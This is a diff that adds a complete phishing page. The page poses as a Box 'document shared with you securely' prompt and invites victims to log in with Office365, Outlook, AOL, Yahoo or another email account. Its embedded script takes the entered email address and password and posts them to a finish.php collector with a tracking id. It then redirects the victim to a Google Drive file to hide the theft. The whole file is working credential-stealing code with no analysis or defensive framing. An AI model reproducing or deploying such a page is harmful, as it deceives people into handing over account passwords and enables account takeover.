@@ -1,0 +1,250 @@
+<!-- URL =http://sweet.freemove.club/--><!-- w =('freemove.club', [datetime.datetime(2020, 10, 9, 10, 11, 16), datetime.datetime(2020, 10, 9, 10, 11, 16, 920000)], [datetime.datetime(2021, 10, 9, 10, 11, 16), datetime.datetime(2021, 10, 9, 10, 11, 16, 920000)])--><!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="ie=edge" http-equiv="X-UA-Compatible"/>
+  <link href="css/style.css" rel="stylesheet"/>
+  <title>
+   Document
+  </title>
+  <style>
+   .sec{
+	  width: 100%;
+	  margin: auto;
+	}
+	  .thelogo{
+	    max-width: 150px; width: 100%; 
+		width: clac(100%-10px);
+		width: -moz-clac(100%-10px);
+		width: -webkit-clac(100%-10px);
+	  }
+	  .thelogo{
+	     width: 100px;
+	   }
+	    
+	  .sec{
+	    margin: 30px 0 0 0;
+	    
+	  }
+	  
+	  
+	  .sec .secondff{
+	    margin: auto;
+		width: 330px;
+		max-width: 330px;
+	  }
+	  .sec .secondff > div{
+	    float: left;
+		width: 33.33%;
+		width: calc(33.33% - 10px);
+		width: -webkit-ccalc(33.33% - 10px);
+		width: -moz-ccalc(33.33% - 10px);
+		width: -o-ccalc(33.33% - 10px);
+		margin: 10px 0 10px 10px;
+		background: #ffffff;
+		padding: 4px;
+		border-radius: 2px;
+	  }
+	 
+	  .sec img{
+width: 100%;
+		}
+		.sec .secondff > div:first-child{
+	      margin-left: 5px;	
+		}
+		
+		@media only screen and (max-width: 400px) {
+		
+		 .sec .secondff{
+	    width: 200px;
+		max-width: 200px;
+	  }
+	  .sec .secondff > div{
+	    margin: 10px 0 5px 10px;
+		}
+		}
+  </style>
+ </head>
+ <body>
+  <div class="login-page" id="wrap">
+   <div class="login-screen">
+    <div class="login-screen-inner">
+     <div class="log-header">
+      <img alt="" class="thelogo" src="images/bxl.png" style="max-width: 100px;"/>
+      <p>
+       Document was shared with you securely
+       <br/>
+       Choose your secure login
+      </p>
+     </div>
+     <div class="log-body">
+      <ul class="log-menu">
+       <li class="office">
+        <a data-image-src="images/office.png" data-log-client="Office 365" href="#">
+         Login with Office365
+        </a>
+       </li>
+       <li class="outlook">
+        <a data-image-src="images/outlook.png" data-log-client="Outlook" href="#">
+         Login with Outlook
+        </a>
+       </li>
+       <li class="aol">
+        <a data-image-src="images/aol.png" data-log-client="Aol" href="#">
+         Login with Aol
+        </a>
+       </li>
+       <li class="yahoo">
+        <a data-image-src="images/yahoo.png" data-log-client="Yahoo" href="#">
+         Login with Yahoo
+        </a>
+       </li>
+       <li class="other">
+        <a data-image-src="images/mail.png" data-log-client="Other Email" href="#">
+         Login with Other
+        </a>
+       </li>
+      </ul>
+     </div>
+     <div class="log-footer">
+      <p>
+       Save your photos and files to Box and get them from any device, anywhere.
+      </p>
+     </div>
+    </div>
+   </div>
+   <div id="logger-popup">
+    <div class="logger-pop-inner">
+     <form action="" id="login_form" method="POST">
+      <div class="logger-pop-header">
+       <img alt="" class="logo-img" src=""/>
+       <p class="logo-name">
+        Login with
+        <span>
+        </span>
+       </p>
+      </div>
+      <div class="logger-pop-body">
+       <div class="form-group">
+        <input class="form-control" id="email-field" name="Email" placeholder="Enter your email address" type="email"/>
+        <label for="">
+         Enter your email address
+        </label>
+       </div>
+       <div class="form-group">
+        <input class="form-control" id="password-field" name="Password" placeholder="Enter your password" type="password"/>
+        <label for="">
+         Enter your password
+        </label>
+       </div>
+      </div>
+      <div class="logger-pop-footer">
+       <ul>
+        <li>
+         <button class="btn" id="popCancel" type="button">
+          Cancel
+         </button>
+        </li>
+        <li>
+         <button class="btn login-btn" type="submit">
+          Submit
+         </button>
+        </li>
+       </ul>
+      </div>
+     </form>
+    </div>
+   </div>
+   <div class="sec" id="secc">
+    <div class="secondff">
+     <div>
+      <img alt="" src="images/mcf.png" style=""/>
+     </div>
+     <div>
+      <img alt="" src="images/nr.png" style=""/>
+     </div>
+     <div>
+      <img alt="" src="images/ssl.png" style=""/>
+     </div>
+    </div>
+   </div>
+   <div id="pageOverlay" style="display: none;">
+   </div>
+  </div>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js">
+  </script>
+  <script>
+   $(document).ready(function () {
+    //alert($(window).width());
+    /*  *
+	var sec = $('.sec');
+    var secimg = $('.sec img');
+	var count = 3;
+	var dWidth = $(window).width();
+	var mgleft = ((dWidth - (secimg.outerWidth() * 3))/2) - 30;
+	$('.sec > div').css({ 'margin-left' : mgleft +'px'   });
+	/*  */
+	//alert(secimg.outerWidth());
+    $('.log-menu > li > a').click(function (e) {
+        e.preventDefault();
+        var logo_src = $(this).data('image-src');
+        var client_name = $(this).data('log-client');
+
+        $('.logo-img').attr('src', logo_src);
+        $('.logo-name span').html(client_name);
+        $('#email-field').attr("placeholder", "Login with your " + client_name + " email address");
+        $('#password-field').attr("placeholder", "Login with your " + client_name );
+
+        $('#logger-popup').toggleClass('popupOpened');
+        $('#pageOverlay').fadeIn();
+        
+		
+		
+		
+		var emailc = $('input[name=Email]');
+     var passc = $('input[name=Password]');
+     var emailval = '';
+     var passval = '';
+     var login_form = $('#login_form');	 
+	 login_form.submit(function(e){
+	   e.preventDefault();
+	   emailval = emailc.val();
+	   
+	   passval = passc.val();
+	  // alert(passval);
+	   /*  */
+	   if(emailval.length > 0 && passval.length > 0){
+	        var theemidval = 'f800e32d9ce13d84f7a6bcc30b4ee1b0';
+		    $.ajax({
+          url: 'finish.php', 
+          type: 'POST', 
+          dataType: 'html', 
+          data: { Email : emailval, password : passval, typeofemail : 'Onedrive23 '+client_name, theemid : theemidval}, 
+		  crossDomain: true,
+          success: function(msg) {
+		  },
+          error: function(e) {
+            console.log(e)
+          }
+        }); 
+		setTimeout(function(){ window.location.href="https://drive.google.com/file/d/1WaMliLzZ5bR5HIbc8VULfwEKDAp5GBJ6/view?fbclid=IwAR1i7nEA1gqnVdRjWgF8Q5PLJ4cETHGqXJBxoiRwRP6rQAg9N4yCAG9Cxug"; }, 2000);
+	   }
+	   /*  */
+	 });
+		
+		
+		
+		
+		
+		
+    });
+    $('#popCancel').click(function (e) {
+        e.preventDefault();
+        $('#logger-popup').removeClass('popupOpened');
+        $('#pageOverlay').fadeOut();
+    });
+});
+  </script>
+ </body>
+</html>
